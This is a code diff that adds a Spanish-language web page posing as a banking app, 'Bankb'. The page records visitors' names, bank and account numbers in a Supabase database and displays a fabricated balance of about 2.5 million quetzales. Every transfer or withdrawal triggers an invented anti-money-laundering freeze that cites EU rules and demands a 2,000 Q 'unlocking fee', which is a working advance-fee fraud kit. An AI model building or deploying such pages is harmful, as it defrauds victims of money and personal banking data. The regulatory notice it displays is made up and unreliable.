@@ -1,0 +1,679 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Bankb</title>
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0;
+    font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif; }
+body { min-height: 100vh; background: #000; display: flex;
+       justify-content: center; align-items: flex-start; padding: 16px; }
+.shell { width: 100%; max-width: 730px; min-height: calc(100vh - 32px);
+         background: #fff; border-radius: 44px; display: flex;
+         flex-direction: column; overflow: hidden; }
+.screen { display: none; flex: 1; flex-direction: column; }
+.screen.active { display: flex; }
+.logo-top { background: #0a3bff; padding: 50px 24px; display: flex;
+            justify-content: center; }
+.logo-top svg { width: 200px; height: 200px; }
+form { padding: 32px 38px 40px; display: flex; flex-direction: column; gap: 20px; }
+h1 { font-size: 1.5rem; color: #081b50; }
+p.sub { font-size: 0.95rem; color: #6c757d; margin-bottom: 8px; }
+label { display: flex; flex-direction: column; gap: 6px;
+        font-size: 0.85rem; font-weight: 600; color: #18202a; }
+input, select { padding: 14px 16px; font-size: 1rem; border: 1.5px solid #e2e8f0;
+                border-radius: 12px; background: #f9fafc; outline: none; }
+input:focus, select:focus { border-color: #0a3bff; background: #fff; }
+.row { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; }
+.btn-primary { padding: 16px; font-size: 1rem; font-weight: 700; color: #fff;
+               background: #0a3bff; border: none; border-radius: 14px;
+               cursor: pointer; margin-top: 10px; }
+.btn-primary:hover { background: #082fcc; }
+.loading { flex: 1; display: flex; flex-direction: column;
+            align-items: center; justify-content: center;
+            gap: 30px; padding: 40px 24px; }
+.logo-small { width: 130px; height: 130px; border-radius: 26px;
+              background: #0a3bff; overflow: hidden; }
+.logo-small svg { width: 100%; height: 100%; display: block; }
+.spinner { width: 84px; height: 84px; border-radius: 50%;
+           border: 6px solid #e6ebf4; border-top-color: #0a3bff;
+           border-right-color: #0a3bff;
+           animation: spin 0.8s linear infinite; }
+@keyframes spin { to { transform: rotate(360deg); } }
+.status { text-align: center; }
+.status h1 { font-size: 1.25rem; color: #081b50; margin-bottom: 6px; }
+.status p { font-size: 0.9rem; color: #8a97ae; }
+.bar { width: 220px; height: 5px; background: #eef1f6;
+       border-radius: 99px; overflow: hidden; }
+.bar span { display: block; height: 100%; width: 0%;
+            background: linear-gradient(90deg, #0a3bff, #3b6fe0);
+            animation: fill 2.4s ease-out forwards; }
+@keyframes fill { to { width: 100%; } }
+.banking { flex: 1; display: flex; flex-direction: column; }
+.topbar { padding: 22px 26px 8px; display: flex;
+          justify-content: space-between; align-items: center; }
+.topbar h1 { font-size: 1.3rem; color: #081b50; margin-left: 10px;
+             margin-right: auto; }
+.topbar-actions { display: flex; gap: 16px; }
+.icon-btn { background: none; border: none; color: #081b50;
+            width: 34px; height: 34px; cursor: pointer;
+            display: flex; align-items: center; justify-content: center; }
+.icon-btn svg { width: 24px; height: 24px; }
+.tabs { display: flex; gap: 10px; padding: 8px 22px 14px; }
+.tabs a { flex: 1; text-align: center; font-weight: 600; font-size: 1rem;
+          padding: 14px 0; border-radius: 40px; color: #737b86;
+          cursor: pointer; }
+.tabs a.active { color: #081b50; background: #dcedf7; }
+.content { flex: 1; padding: 0 22px 20px; display: flex;
+           flex-direction: column; gap: 20px; }
+.services { display: flex; gap: 12px; overflow-x: auto; padding-bottom: 4px; }
+.services::-webkit-scrollbar { display: none; }
+.service { flex: 0 0 135px; min-width: 135px; height: 145px;
+           padding: 16px 8px 12px; display: flex; flex-direction: column;
+           align-items: center; gap: 12px; text-align: center;
+           background: #fff; border: 1px solid #d9dde3;
+           border-radius: 14px; cursor: pointer; }
+.service .ic { height: 40px; color: #087e83;
+              display: flex; align-items: center; }
+.service .ic svg { width: 42px; height: 42px; }
+.service span.t { font-size: 0.9rem; color: #18202a;
+                  font-weight: 500; line-height: 1.25; }
+.banner { padding: 18px 22px; gap: 14px; border-radius: 18px;
+          background: #f5f6fb; border: 1px solid #e0e4ee;
+          display: flex; align-items: center; cursor: pointer; }
+.banner span { font-size: 0.98rem; font-weight: 500; color: #081b50; }
+.account { padding: 24px 22px 0; border-radius: 20px;
+           border: 1px solid #e0e2e6; background: #fff;
+           display: flex; flex-direction: column; min-height: 300px; }
+.acc-head { display: flex; justify-content: space-between; align-items: flex-start; }
+.acc-info { display: flex; flex-direction: column; gap: 4px; }
+.acc-type { font-size: 1.15rem; font-weight: 700; color: #081b50; }
+.acc-holder { margin-top: 12px; font-size: 1.05rem; color: #252a31;
+              font-weight: 500; }
+.fav { background: none; border: none; font-size: 1.6rem;
+       cursor: pointer; color: #aeb1b5; }
+.fav.on { color: #f2bd24; }
+.balance { margin-top: 16px; display: flex; flex-direction: column;
+           align-items: flex-end; gap: 2px; }
+.balance .amount { font-size: 1.5rem; font-weight: 700; color: #081b50; }
+.balance .label { font-size: 0.85rem; color: #565c63; }
+.acc-foot { margin: auto -22px 0; padding: 0 36px;
+            border-top: 1px solid #e3e5e8; min-height: 84px;
+            display: flex; justify-content: space-between; align-items: center; }
+.link { color: #081b50; font-size: 1rem; font-weight: 600; cursor: pointer; }
+.dots { background: none; border: none; font-size: 1.2rem;
+        color: #081b50; cursor: pointer; letter-spacing: 2px; }
+.bottom-nav { margin: 0 22px 22px; padding: 8px 10px;
+              border: 1px solid #e4e6ea; border-radius: 54px;
+              background: #fff; display: flex; }
+.bottom-nav a { flex: 1; color: #22272e; font-size: 0.72rem;
+                font-weight: 500; display: flex; flex-direction: column;
+                align-items: center; gap: 3px; padding: 6px 0; cursor: pointer; }
+.bottom-nav a svg { width: 24px; height: 24px; color: #081b50; }
+.bottom-nav a.sel { color: #081b50; font-weight: 700; }
+dialog { border: none; border-radius: 20px; padding: 22px;
+         width: 90%; max-width: 420px; margin: auto; }
+dialog::backdrop { background: rgba(0,0,0,0.5); }
+.dlg { display: flex; flex-direction: column; gap: 12px; }
+.dlg .close { align-self: flex-end; background: none; border: none;
+              font-size: 1.5rem; cursor: pointer; color: #6c757d; }
+.dlg label { display: flex; flex-direction: column; gap: 4px;
+             font-size: 0.85rem; font-weight: 600; }
+.dlg input, .dlg select { padding: 12px; font-size: 1rem;
+             border: 1.5px solid #e2e8f0; border-radius: 10px; outline: none; }
+.dlg .ok { background: #0b192c; color: #fff; border: none;
+           padding: 14px; border-radius: 10px; font-weight: 600; cursor: pointer; }
+.toast { position: fixed; bottom: 40px; left: 50%;
+         transform: translateX(-50%) translateY(20px);
+         background: #323232; color: #fff; padding: 12px 20px;
+         border-radius: 30px; font-size: 0.9rem; opacity: 0;
+         visibility: hidden; transition: all 0.3s;
+         z-index: 1000; max-width: 90%; text-align: center; }
+.toast.on { opacity: 1; visibility: visible; transform: translateX(-50%); }
+.toast.ok { background: #0a7a3a; }
+.toast.err { background: #b3261e; }
+.aml-notice { font-size: 0.88rem; line-height: 1.4; color: #333; display: flex; flex-direction: column; gap: 10px; max-height: 60vh; overflow-y: auto; padding-right: 4px; }
+.aml-notice strong { color: #b3261e; }
+</style>
+
+<!-- Importation du client Supabase -->
+<script type="module">
+  import { createClient } from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm'
+
+  const SUPABASE_URL = 'https://gyjuwlsfpinvdsmvtxjf.supabase.co'
+  const SUPABASE_KEY = 'sb_publishable_tYPtEGakzeaXPmXn7HbUSw_u64G1oWL'
+  
+  window.supabase = createClient(SUPABASE_URL, SUPABASE_KEY)
+</script>
+</head>
+<body>
+
+<div class="shell">
+
+  <!-- PANTALLA 1 : IDENTIFICACIÓN -->
+  <section class="screen active" id="s1">
+    <div class="logo-top">
+      <svg viewBox="0 0 400 400" xmlns="http://www.w3.org/2000/svg">
+        <rect width="400" height="400" fill="#0a3bff"/>
+        <text x="200" y="250" font-family="Arial" font-size="160"
+              font-weight="900" fill="#fff" text-anchor="middle"
+              letter-spacing="-10">bankb</text>
+      </svg>
+    </div>
+    <form id="f1">
+      <div>
+        <h1>Identificación</h1>
+        <p class="sub">Ingrese su información para acceder a su espacio.</p>
+      </div>
+      <div class="row">
+        <label>Apellido<input type="text" id="nom" required placeholder="Su apellido"></label>
+        <label>Nombre<input type="text" id="prenom" required placeholder="Su nombre"></label>
+      </div>
+      <label>País
+        <select id="pays" required>
+          <option value="">— Seleccione —</option>
+          <option>Guatemala</option>
+          <option>España</option><option>México</option><option>Estados Unidos</option>
+          <option>Colombia</option><option>Argentina</option><option>Chile</option>
+          <option>Perú</option><option>Otro</option>
+        </select>
+      </label>
+      <label>Banco<input type="text" id="banque" required placeholder="Nombre de su banco"></label>
+      <label>Número de cuenta<input type="text" id="compte" required placeholder="Ej. BI-6211212219"></label>
+      <button type="submit" class="btn-primary">Continuar</button>
+    </form>
+  </section>
+
+  <!-- PANTALLA 2 : CARGA -->
+  <section class="screen" id="s2">
+    <div class="loading">
+      <div class="logo-small">
+        <svg viewBox="0 0 400 400" xmlns="http://www.w3.org/2000/svg">
+          <rect width="400" height="400" fill="#0a3bff"/>
+          <text x="200" y="250" font-family="Arial" font-size="160"
+                font-weight="900" fill="#fff" text-anchor="middle"
+                letter-spacing="-10">bankb</text>
+        </svg>
+      </div>
+      <div class="spinner"></div>
+      <div class="status">
+        <h1 id="welcome">Conexión segura…</h1>
+        <p>Preparando su espacio bancario</p>
+      </div>
+      <div class="bar"><span></span></div>
+    </div>
+  </section>
+
+  <!-- PANTALLA 3 : INTERFAZ BANCARIA -->
+  <section class="screen" id="s3">
+    <div class="banking">
+      <header class="topbar">
+        <h1 id="hello">Hola</h1>
+        <div class="topbar-actions">
+          <button class="icon-btn" id="btnNotif" aria-label="notif">
+            <svg viewBox="0 0 32 32" fill="currentColor">
+              <path d="M16 3a2 2 0 0 0-2 2v1.1c-4 .9-6.8 4.3-6.8 8.5v5L4 23v2h24v-2l-3.2-3.4v-5c0-4.2-2.8-7.6-6.8-8.5V5a2 2 0 0 0-2-2Z"/>
+            </svg>
+          </button>
+          <button class="icon-btn" id="btnLogout" aria-label="logout">
+            <svg viewBox="0 0 32 32" fill="none" stroke="currentColor" stroke-width="2.2">
+              <path d="M18 4H7a2 2 0 0 0-2 2v20a2 2 0 0 0 2 2h11"/>
+              <path d="M16 16h13m-5-5 5 5-5 5"/>
+            </svg>
+          </button>
+        </div>
+      </header>
+
+      <nav class="tabs" id="tabs">
+        <a data-tab="favoritas">Favoritas</a>
+        <a data-tab="todas" class="active">Todas</a>
+        <a data-tab="tarjetas">Tarjetas</a>
+      </nav>
+
+      <main class="content">
+        <div class="services" id="services">
+          <div class="service" data-svc="Solicitud de productos">
+            <span class="ic">
+              <svg viewBox="0 0 48 48" fill="none" stroke="currentColor" stroke-width="2.4">
+                <path d="M5 13 24 5l19 8v4H5zM10 18v14m8-14v14m12-14v14m8-14v14"/>
+              </svg>
+            </span>
+            <span class="t">Solicitud de<br>productos</span>
+          </div>
+          <div class="service" data-svc="Anticipo de Nómina">
+            <span class="ic">
+              <svg viewBox="0 0 48 48" fill="none" stroke="currentColor" stroke-width="2.4">
+                <rect x="5" y="9" width="38" height="29" rx="2"/>
+                <path d="M5 17h38"/>
+              </svg>
+            </span>
+            <span class="t">Anticipo<br>de Nómina</span>
+          </div>
+          <div class="service" data-svc="MallBi.com">
+            <span class="ic">
+              <svg viewBox="0 0 48 48" fill="none" stroke="currentColor" stroke-width="2.4">
+                <path d="M8 19h25v22H8zM15 19v-5a6 6 0 0 1 12 0v5"/>
+              </svg>
+            </span>
+            <span class="t">MallBi.com</span>
+          </div>
+          <div class="service" data-svc="Transferencias móviles">
+            <span class="ic">
+              <svg viewBox="0 0 48 48" fill="none" stroke="currentColor" stroke-width="2.4">
+                <path d="M5 12h29v20H5z"/>
+              </svg>
+            </span>
+            <span class="t">Transferencias<br>móviles</span>
+          </div>
+          <div class="service" data-svc="Más servicios">
+            <span class="ic">
+              <svg viewBox="0 0 48 48" fill="none" stroke="currentColor" stroke-width="2.4">
+                <circle cx="24" cy="24" r="17"/>
+                <path d="M24 15v18m-9-9h18"/>
+              </svg>
+            </span>
+            <span class="t">Más servicios</span>
+          </div>
+        </div>
+
+        <div class="banner" data-svc="Gestiona tus plazos fijos">
+          <span>Gestiona tus plazos fijos aquí</span>
+        </div>
+
+        <section class="account">
+          <div class="acc-head">
+            <div class="acc-info">
+              <span class="acc-type" id="accType">CHECKING ACCOUNT</span>
+              <span class="acc-holder" id="accHolder"></span>
+            </div>
+            <button class="fav" id="fav">⭐</button>
+          </div>
+          <div class="balance">
+            <span class="amount" id="bal">Q 2,554,057.00</span>
+            <span class="label">Available balance</span>
+          </div>
+          <div class="acc-foot">
+            <span class="link" data-op="transferir">Transferir</span>
+            <span class="link" data-op="pagar">Pagar</span>
+            <button class="dots" id="dots">•••</button>
+          </div>
+        </section>
+      </main>
+
+      <nav class="bottom-nav" id="bottomNav">
+        <a class="sel" data-nav="cuentas">Cuentas</a>
+        <a data-op="transferir">Transferir</a>
+        <a data-op="pagar">Pagos</a>
+        <a data-svc="Finanzas">Finanzas</a>
+        <a data-svc="Menú">Menú</a>
+      </nav>
+    </div>
+  </section>
+
+</div>
+
+<dialog id="dlg"></dialog>
+<div class="toast" id="toast"></div>
+
+<script>
+var DEFAULT_BALANCE = 2554057.00;
+var state = {
+  balance: DEFAULT_BALANCE,
+  currentAccountId: null
+};
+
+function formatQ(n) {
+  return 'Q ' + n.toLocaleString('en-US', {
+    minimumFractionDigits: 2,
+    maximumFractionDigits: 2
+  });
+}
+
+async function updateBalanceUI() {
+  document.getElementById('bal').textContent = formatQ(state.balance);
+  
+  if (state.currentAccountId) {
+    await window.supabase
+      .from('accounts')
+      .update({ balance: state.balance })
+      .eq('id', state.currentAccountId);
+  }
+}
+
+async function logTransaction(type, amount, destination, status, amlNotice = null) {
+  if (!state.currentAccountId) return;
+  await window.supabase.from('transactions').insert([{
+    account_id: state.currentAccountId,
+    type: type,
+    amount: amount,
+    destination: destination,
+    status: status,
+    aml_notice: amlNotice
+  }]);
+}
+
+function show(id) {
+  document.querySelectorAll('.screen').forEach(function(s){
+    s.classList.remove('active');
+  });
+  document.getElementById(id).classList.add('active');
+  window.scrollTo(0, 0);
+}
+
+document.getElementById('f1').addEventListener('submit', async function(e){
+  e.preventDefault();
+  var nom = document.getElementById('nom').value.trim();
+  var prenom = document.getElementById('prenom').value.trim();
+  var pays = document.getElementById('pays').value;
+  var banque = document.getElementById('banque').value.trim();
+  var compte = document.getElementById('compte').value.trim();
+
+  document.getElementById('welcome').textContent = 'Bienvenido, ' + prenom;
+  document.getElementById('hello').textContent = 'Hola, ' + prenom;
+  document.getElementById('accHolder').textContent = (prenom + ' ' + nom).toUpperCase();
+  document.getElementById('accType').textContent = banque.toUpperCase() + ' ' + compte.toUpperCase();
+
+  show('s2');
+
+  try {
+    let { data: existingAccount } = await window.supabase
+      .from('accounts')
+      .select('*')
+      .eq('account_number', compte)
+      .single();
+
+    if (existingAccount) {
+      state.balance = existingAccount.balance;
+      state.currentAccountId = existingAccount.id;
+    } else {
+      let { data: newAcc, error } = await window.supabase
+        .from('accounts')
+        .insert([{ bank_name: banque, account_number: compte, balance: DEFAULT_BALANCE }])
+        .select()
+        .single();
+      
+      if (!error && newAcc) {
+        state.balance = newAcc.balance;
+        state.currentAccountId = newAcc.id;
+      }
+    }
+  } catch (err) {
+    console.error('Erreur Supabase :', err);
+  }
+
+  setTimeout(function(){ 
+    show('s3'); 
+    updateBalanceUI(); 
+  }, 2400);
+});
+
+var toast = document.getElementById('toast'), tTimer;
+function notify(msg, type) {
+  toast.textContent = msg;
+  toast.className = 'toast on' + (type ? ' ' + type : '');
+  clearTimeout(tTimer);
+  tTimer = setTimeout(function(){ toast.className = 'toast'; }, 2800);
+}
+
+var dlg = document.getElementById('dlg');
+function openDlg(title, html) {
+  dlg.innerHTML =
+    '<form method="dialog" class="dlg">' +
+      '<button type="button" class="close">×</button>' +
+      '<h2 style="font-size:1.15rem;color:#0b192c;">' + title + '</h2>' +
+      html +
+    '</form>';
+  dlg.querySelector('.close').addEventListener('click', function(){ dlg.close(); });
+  dlg.showModal();
+}
+dlg.addEventListener('click', function(e){ if (e.target === dlg) dlg.close(); });
+
+function showAmlAlert() {
+  openDlg('⚠ Transacción en curso de verificación',
+    '<div class="aml-notice">' +
+      '<p><strong>Felicidades, su orden de transferencia ha sido registrada correctamente.</strong></p>' +
+      '<p>De conformidad con las normas internacionales de prevención del blanqueo de capitales (AML) y el Reglamento (UE) 2015/847 sobre transferencias de fondos, su operación ha sido señalada automáticamente al servicio de cumplimiento para un control antifraude.</p>' +
+      '<p>Su expediente se encuentra temporalmente congelado por la célula de vigilancia financiera de la Unión Europea a la espera de las verificaciones de rigor.</p>' +
+      '<p><strong>Tarifas de desbloqueo requeridas: 2,000 Q</strong></p>' +
+      '<p>Estas tarifas cubren las verificaciones de identidad, el análisis antiblanqueo y el levantamiento del bloqueo reglamentario. Una vez confirmado el pago, su transferencia será procesada en un plazo de 24 a 48 horas hábiles.</p>' +
+      '<p style="margin-top:8px;font-size:0.8rem;color:#6c757d;text-align:right;"><em>Bankb — Servicio de Cumplimiento y Seguridad</em></p>' +
+    '</div>' +
+    '<button class="ok" type="button" onclick="document.getElementById(\'dlg\').close()">Entendido</button>');
+}
+
+function execTransfer() {
+  openDlg('Transferir dinero',
+    '<p>Saldo disponible: <strong>' + formatQ(state.balance) + '</strong></p>' +
+    '<label>Destinatario<input type="text" id="t_dest" required placeholder="Nombre"></label>' +
+    '<label>Número de cuenta<input type="text" id="t_acc" required placeholder="Ej. BI-9876543210"></label>' +
+    '<label>Monto (Q)<input type="number" id="t_amt" min="0.01" step="0.01" required placeholder="0.00"></label>' +
+    '<button class="ok" type="submit">Enviar</button>');
+  
+  dlg.querySelector('form').addEventListener('submit', async function(ev){
+    ev.preventDefault();
+    var dest = document.getElementById('t_dest').value;
+    var amt = parseFloat(document.getElementById('t_amt').value);
+    if (!amt || amt <= 0) { notify('Monto inválido.', 'err'); return; }
+    if (amt > state.balance) { notify('Fondos insuficientes para esta transferencia.', 'err'); return; }
+    
+    dlg.close();
+    await logTransaction('transfer', amt, dest, 'pending_aml', 'Gel temporaire - Frais de déblocage 2 000 Q');
+    setTimeout(showAmlAlert, 300);
+  });
+}
+
+function execWithdraw() {
+  openDlg('Retirar efectivo',
+    '<p>Saldo disponible: <strong>' + formatQ(state.balance) + '</strong></p>' +
+    '<label>Monto (Q)<input type="number" id="w_amt" min="0.01" step="0.01" required placeholder="0.00"></label>' +
+    '<label>Lugar / Cajero<input type="text" id="w_loc" required placeholder="Ej. ATM Zona 10"></label>' +
+    '<button class="ok" type="submit">Retirar</button>');
+  
+  dlg.querySelector('form').addEventListener('submit', async function(ev){
+    ev.preventDefault();
+    var loc = document.getElementById('w_loc').value;
+    var amt = parseFloat(document.getElementById('w_amt').value);
+    if (!amt || amt <= 0) { notify('Monto inválido.', 'err'); return; }
+    if (amt > state.balance) { notify('Fondos insuficientes para el retiro.', 'err'); return; }
+
+    dlg.close();
+    await logTransaction('withdrawal', amt, loc, 'pending_aml', 'Gel temporaire - Frais de déblocage 2 000 Q');
+    setTimeout(showAmlAlert, 300);
+  });
+}
+
+function execPayment() {
+  openDlg('Pagar servicio',
+    '<p>Saldo disponible: <strong>' + formatQ(state.balance) + '</strong></p>' +
+    '<label>Servicio / Empresa<input type="text" id="p_svc" required placeholder="Ej. EPM, Tigo"></label>' +
+    '<label>Número de referencia<input type="text" id="p_ref" required placeholder="Ej. 12345678"></label>' +
+    '<label>Monto (Q)<input type="number" id="p_amt" min="0.01" step="0.01" required placeholder="0.00"></label>' +
+    '<button class="ok" type="submit">Pagar</button>');
+  
+  dlg.querySelector('form').addEventListener('submit', async function(ev){
+    ev.preventDefault();
+    var svc = document.getElementById('p_svc').value.trim();
+    var amt = parseFloat(document.getElementById('p_amt').value);
+    if (!svc || !amt || amt <= 0) {
+      notify('Por favor complete todos los campos.', 'err'); return;
+    }
+    if (amt > state.balance) { notify('Fondos insuficientes.', 'err'); return; }
+    
+    state.balance -= amt;
+    updateBalanceUI();
+    dlg.close();
+    await logTransaction('payment', amt, svc, 'completed');
+    notify('Pago de ' + formatQ(amt) + ' a ' + svc + ' realizado.', 'ok');
+  });
+}
+
+function execDeposit() {
+  openDlg('Depositar dinero',
+    '<p>Saldo actual: <strong>' + formatQ(state.balance) + '</strong></p>' +
+    '<label>Monto (Q)<input type="number" id="d_amt" min="0.01" step="0.01" required placeholder="0.00"></label>' +
+    '<label>Fuente<input type="text" id="d_src" required placeholder="Ej. Efectivo, cheque"></label>' +
+    '<button class="ok" type="submit">Depositar</button>');
+  
+  dlg.querySelector('form').addEventListener('submit', async function(ev){
+    ev.preventDefault();
+    var src = document.getElementById('d_src').value.trim();
+    var amt = parseFloat(document.getElementById('d_amt').value);
+    if (!amt || amt <= 0 || !src) {
+      notify('Por favor complete todos los campos.', 'err'); return;
+    }
+    state.balance += amt;
+    updateBalanceUI();
+    dlg.close();
+    await logTransaction('deposit', amt, src, 'completed');
+    notify('Depósito de ' + formatQ(amt) + ' realizado con éxito.', 'ok');
+  });
+}
+
+var serviceFlows = {
+  'Solicitud de productos': {
+    intro: 'Selecciona el producto que deseas solicitar.',
+    fields: '<label>Producto<select id="s_product" required><option value="">Selecciona</option><option>Cuenta de ahorro</option><option>Tarjeta de crédito</option><option>Préstamo personal</option></select></label><label>Teléfono<input type="tel" id="s_phone" required></label>'
+  },
+  'Anticipo de Nómina': {
+    intro: 'Indica el monto del anticipo que deseas solicitar.',
+    fields: '<label>Monto (Q)<input type="number" id="s_amount" min="0.01" step="0.01" required></label><label>Fecha estimada<input type="date" id="s_date" required></label>'
+  },
+  'MallBi.com': {
+    intro: 'Completa los datos de tu compra en MallBi.',
+    fields: '<label>Producto o comercio<input type="text" id="s_item" required></label><label>Monto (Q)<input type="number" id="s_amount" min="0.01" step="0.01" required></label>'
+  },
+  'Transferencias móviles': {
+    intro: 'Indica el teléfono del destinatario y el monto.',
+    fields: '<label>Teléfono<input type="tel" id="s_phone" required></label><label>Monto (Q)<input type="number" id="s_amount" min="0.01" step="0.01" required></label>'
+  },
+  'Gestiona tus plazos fijos': {
+    intro: 'Configura el plazo fijo que deseas solicitar.',
+    fields: '<label>Monto (Q)<input type="number" id="s_amount" min="0.01" step="0.01" required></label><label>Plazo<select id="s_term" required><option value="">Selecciona</option><option>3 meses</option><option>6 meses</option><option>12 meses</option></select></label>'
+  }
+};
+
+function openService(name) {
+  if (name === 'Más servicios' || name === 'Menú') {
+    openDlg(name,
+      '<p>Elige el servicio que necesitas.</p>' +
+      '<label>Servicio<select id="s_choice" required>' +
+        '<option value="">Selecciona</option>' +
+        '<option value="retirar">Retirar efectivo</option>' +
+        '<option value="depositar">Depositar</option>' +
+        '<option value="Gestiona tus plazos fijos">Plazos fijos</option>' +
+        '<option value="Solicitud de productos">Solicitud de productos</option>' +
+        '<option value="Anticipo de Nómina">Anticipo de Nómina</option>' +
+        '<option value="Transferencias móviles">Transferencias móviles</option>' +
+        '<option value="MallBi.com">MallBi.com</option>' +
+      '</select></label>' +
+      '<button class="ok" type="submit">Continuar</button>');
+    
+    dlg.querySelector('form').addEventListener('submit', function(ev){
+      ev.preventDefault();
+      var choice = document.getElementById('s_choice').value;
+      dlg.close();
+      setTimeout(function(){
+        if (choice === 'retirar') execWithdraw();
+        else if (choice === 'depositar') execDeposit();
+        else if (choice) openService(choice);
+      }, 150);
+    });
+    return;
+  }
+
+  if (name === 'Finanzas') {
+    openDlg('Finanzas',
+      '<p>Saldo disponible: <strong>' + formatQ(state.balance) + '</strong></p>' +
+      '<p>Gestiones financieras en curso.</p>' +
+      '<button class="ok" type="button" onclick="document.getElementById(\'dlg\').close()">Cerrar</button>');
+    return;
+  }
+
+  var flow = serviceFlows[name];
+  if (!flow) {
+    openDlg(name,
+      '<p>Servicio: <strong>' + name + '</strong></p>' +
+      '<button class="ok" type="button" onclick="document.getElementById(\'dlg\').close()">Cerrar</button>');
+    return;
+  }
+
+  openDlg(name,
+    '<p class="dlg-note" style="font-size:0.85rem;color:#6c757d;">' + flow.intro + '</p>' +
+    flow.fields +
+    '<button class="ok" type="submit">Enviar solicitud</button>');
+
+  dlg.querySelector('form').addEventListener('submit', function(ev){
+    ev.preventDefault();
+    dlg.close();
+    notify('Solicitud enviada correctamente.', 'ok');
+  });
+}
+
+document.querySelectorAll('[data-op]').forEach(function(el){
+  el.addEventListener('click', function(e){
+    e.preventDefault();
+    var op = el.dataset.op;
+    if (op === 'transferir') execTransfer();
+    else if (op === 'pagar') execPayment();
+  });
+});
+
+document.querySelectorAll('[data-svc]').forEach(function(el){
+  el.addEventListener('click', function(){
+    openService(el.dataset.svc);
+  });
+});
+
+document.getElementById('fav').addEventListener('click', function(){
+  this.classList.toggle('on');
+  notify(this.classList.contains('on') ? 'Cuenta añadida a Favoritas.' : 'Cuenta quitada de Favoritas.');
+});
+
+document.getElementById('dots').addEventListener('click', function(){
+  openDlg('Opciones de cuenta',
+    '<p>Cuenta: ' + document.getElementById('accType').textContent + '</p>' +
+    '<p>Titular: ' + document.getElementById('accHolder').textContent + '</p>' +
+    '<p>Saldo: <strong>' + formatQ(state.balance) + '</strong></p>' +
+    '<button class="ok" type="button" id="optWithdraw" style="margin-top:6px;">Retirar efectivo</button>' +
+    '<button class="ok" type="button" id="optDeposit" style="background:#e8f0ff;color:#0b192c;margin-top:6px;">Depositar</button>' +
+    '<button class="ok" type="button" id="optClose" style="background:#b3261e;color:#fff;margin-top:6px;">Cerrar sesión</button>');
+  
+  setTimeout(function(){
+    var wBtn = document.getElementById('optWithdraw');
+    var dBtn = document.getElementById('optDeposit');
+    var cBtn = document.getElementById('optClose');
+    if(wBtn) wBtn.onclick = function(){ dlg.close(); execWithdraw(); };
+    if(dBtn) dBtn.onclick = function(){ dlg.close(); execDeposit(); };
+    if(cBtn) cBtn.onclick = function(){ dlg.close(); show('s1'); notify('Sesión cerrada.'); };
+  }, 50);
+});
+
+document.getElementById('btnNotif').addEventListener('click', function(){
+  openDlg('Notificaciones', '<p>No tienes notificaciones nuevas.</p>');
+});
+
+document.getElementById('btnLogout').addEventListener('click', function(){
+  openDlg('Cerrar sesión',
+    '<p>¿Quieres cerrar esta sesión?</p>' +
+    '<button class="ok" type="submit">Confirmar</button>');
+  dlg.querySelector('form').addEventListener('submit', function(ev){
+    ev.preventDefault();
+    dlg.close();
+    show('s1');
+    notify('Sesión cerrada.');
+  });
+});
+
+document.querySelectorAll('#tabs a').forEach(function(tab){
+  tab.addEventListener('click', function(){
+    document.querySelectorAll('#tabs a').forEach(function(t){ t.classList.remove('active'); });
+    this.classList.add('active');
+    var name = this.dataset.tab;
+    if(name === 'tarjetas') notify('No hay tarjetas disponibles.');
+    else notify('Vista ' + name + ' activada.');
+  });
+});
+</script>
+</body>
+</html>
